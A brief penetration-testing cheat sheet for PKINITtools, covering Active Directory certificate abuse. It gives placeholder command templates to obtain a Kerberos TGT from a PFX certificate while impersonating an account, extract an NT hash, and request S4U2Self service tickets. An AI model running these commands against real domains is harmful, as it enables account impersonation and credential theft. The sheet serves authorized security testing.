# PKINITtools

% adcs, certificate, pki, windows, Active directory, template, shadow credential


## Request a TGT using a PFX
#plateform/linux #target/remote #cat/RECON
error "KDC has no support for PADATA type (pre-authentication data)" means DC do not support PKINIT because their certificates do not have the Smart Card Logon EKU

use PassTheCert.py to attack ldap with a cert but no tgt can be obtained
```
gettgtpkinit -cert-pfx <pfx_file_> -pfx-pass <pfx_password|jubeaz> -dc-ip <dc_ip> <domain>/<accountToImpersonate> <ccache_path>
```

## hash from TGT and AS REP key
#plateform/linux #target/remote #cat/RECON
```
export KRB5CCNAME=<cache-path> && getnthash <domain>/<ComputerAccount> -key <key>
```

## silver ticket using a certificate
#plateform/linux #target/remote #cat/RECON
```
gets4uticket 
```
Uses Kerberos S4U2Self to request a service ticket that is valid on the host for which you've obtained a certificate